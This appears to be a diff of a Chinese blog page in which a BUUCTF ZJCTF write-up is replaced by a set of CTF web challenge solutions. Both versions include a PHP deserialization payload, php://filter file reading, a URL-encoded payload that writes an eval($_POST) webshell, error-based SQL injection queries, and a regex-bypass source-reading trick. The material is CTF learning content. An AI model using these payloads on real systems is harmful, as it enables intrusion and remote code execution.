@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF-ZJCTF做题笔记, Chenluo">
+    <meta name="keywords" content="721, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF-ZJCTF做题笔记 | Chenluo</title>
+    <title>721 | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF-ZJCTF做题笔记</h1>
+                    <h1 class="description center-align post-title">721</h1>
                 </div>
             </div>
         </div>
@@ -445,8 +445,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/BUUCTF/">
-                                <span class="chip bg-color">BUUCTF</span>
+                            <a href="/tags/721/">
+                                <span class="chip bg-color">721</span>
                             </a>
                         
                     </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-02
+                    2021-07-29
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    181
+                    767
                 </div>
                 
 
@@ -490,37 +490,130 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ul>
-<li>直接构造payload:</li>
+                <h2 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h2><ol>
+<li>绕过<code>$_SERVER[&#39;QUERY_STRING&#39;]</code></li>
+</ol>
+<ul>
+<li>采用url编码的方式</li>
 </ul>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">view-source:http:&#x2F;&#x2F;5e61447f-2d28-46b3-b6b8-8939e1fbded5.node3.buuoj.cn&#x2F;?text&#x3D;data:%2f%2ftext%2fplain,welcome%20to%20the%20zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">filename : %66%69%6c%65%6e%61%6d%65
 
-<p>第一个利用data协议绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;2.php  :   
+%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%77%72%69%74%65%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%32%2e%70%68%70
+content : %63%6f%6e%74%65%6e%74
 
-<p>第二个利用php://filter，读取</p>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+&lt;?php eval($_POST[a]);?&gt; : aPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+  :  %61%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%59%56%30%70%4f%7a%38%2b
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>第三个序列化</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php</span>
-    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol start="2">
+<li>绕过<code>$_REQUEST</code>正则</li>
+</ol>
+<ul>
+<li>POST传入相同的参数</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">POST: filename&#x3D;1&amp;content&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>注意:<br>要删除<code>cookie</code>的所有值</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsubtx5683j313w0aogng.jpg" alt="image-20210726141808725"></p>
+<ul>
+<li>输入文件成功的界面</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsubytm6x9j30xi06ogmt.jpg" alt="image-20210726142256087"></p>
+<ol start="3">
+<li>访问2.php执行rce</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsuc05ym26j30mm0fr3zh.jpg" alt="image-20210726142408416"></p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><ol>
+<li>文件包含绕过</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">a&#x3D;include($_POST[b]);&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;show_flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>最后读取flag时，要将<code>php://filter</code>去掉</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsuc4scolrj313y0f1jtd.jpg" alt="image-20210726142839205"></p>
+<ol start="2">
+<li>解码之后，访问show_flag.php传参</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">zz[0]&#x3D;FLAG&amp;zz[1]&#x3D;printflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsuc986rb5j313g0bkjso.jpg" alt="image-20210726143256240"></p>
+<ol start="3">
+<li>拿到flag，html实体解码，最后base64解码</li>
+</ol>
+<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>不知道绕过姿势的同学可以参考一下这个博客<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuwin/p/7867873.html">小技巧</a></p>
+<ul>
+<li>已知列名</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">true and linestring(id);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsufuqxjtgj30jm0dwjs4.jpg" alt="image-20210726163725167"></p>
+<p><strong>数据库名字<code>mysql</code>,表名:<code>ctf_oaa_me</code>字段名:<code>id</code></strong></p>
+<ul>
+<li>·根据上面信息寻找其他字段，参考上面博客的姿势</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;true and (select * from(select * from mysql.ctf_oaa_me a join mysql.ctf_oaa_me b using(id))c);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsufy116k8j30u00d175e.jpg" alt="image-20210726164035193"></p>
+<ul>
+<li>继续找</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;true and (select * from(select * from mysql.ctf_oaa_me a join mysql.ctf_oaa_me b using(id,username))c);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsufz14dbcj30v70ci3zu.jpg" alt="image-20210726164132563"></p>
+<ul>
+<li>找到字段名直接输出</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">true and linestring((select * from(select * from(select flag_cksjodjanckd from mysql.ctf_oaa_me)a)b));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsug1rwylqj31050ff769.jpg" alt="image-20210726164411164"></p>
+<ul>
+<li><strong>报错注入有好几种，不止<code>updatexml，extractvalue，floor</code></strong></li>
+</ul>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><ol>
+<li>扫目录</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsug7th9kqj30dt03yjs3.jpg" alt="2088F68F-8884-461E-9A52-4E4C538A309F"></p>
+<ol start="2">
+<li>还原看下源码</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsug9m1j3nj30fu0b30tk.jpg" alt="image-20210726165142225"></p>
+<ul>
+<li>正则是不允许那么多字母按那么多顺序出现，直接无字符字母绕过正则，构造POST数据包</li>
+</ul>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://114.115.207.198:200/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--链接是当前打开的题目链接--></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>抓包修改数据发送</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsugup5p6sj30zj09oabu.jpg" alt="image-20210726171159128"></p>
+<ul>
+<li>访问aGho.php</li>
+</ul>
+<p><strong>正则可以参考<code>ctfshow，web40</code>绕过</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">print_r() 函数用于打印变量，以更容易理解的形式展示localeconv()：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)
+pos()：返回数组中的当前元素的值。这里也可以换成current()，作用和pos类似
+array_reverse()：数组逆序
+scandir()：获取目录下的文件
+next()： 函数将内部指针指向数组中的下一个元素，并输出。
+通过 pos(localeconv())得到点号因为scandir(&#39;.&#39;)表示得到当前目录下的文件PS：如果我没有记错，scnadir(&#39;&#x2F;&#39;)也能扫描当前目录下面的文件，但是这道题貌似无法使用chr(47)和chr(48)（.和&#x2F;的ASCII码）进行过滤的绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">?cshow_source(next(array_reverse(scandir(current(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 
                 
             </div>
@@ -547,7 +640,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/06/02/7890.html">http://echo-machile.github.io/2021/06/02/7890.html</a>
+                    <a href="http://echo-machile.github.io/2021/07/29/75.html">http://echo-machile.github.io/2021/07/29/75.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -585,8 +678,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/BUUCTF/">
-                                    <span class="chip bg-color">BUUCTF</span>
+                                <a href="/tags/721/">
+                                    <span class="chip bg-color">721</span>
                                 </a>
                             
                         </div>
@@ -1044,13 +1137,13 @@ document.body.addEventListener('click', function(e) {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/06/02/767.html">
+                <a href="/2021/07/29/7299.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="BUUCTF-MRCTF做题笔记">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ctfshow-SSRF">
                         
-                        <span class="card-title">BUUCTF-MRCTF做题笔记</span>
+                        <span class="card-title">ctfshow-SSRF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1061,7 +1154,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
                         </span>
                         <span class="publish-author">
                             
@@ -1074,8 +1167,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
@@ -1089,13 +1182,13 @@ document.body.addEventListener('click', function(e) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/02/790.html">
+                <a href="/2021/07/29/7734.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="BUUCTF-网鼎杯做题笔记">
+                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="ctfshow-ssti注入">
                         
-                        <span class="card-title">BUUCTF-网鼎杯做题笔记</span>
+                        <span class="card-title">ctfshow-ssti注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1106,7 +1199,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
                             </span>
                         <span class="publish-author">
                             
@@ -1119,8 +1212,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
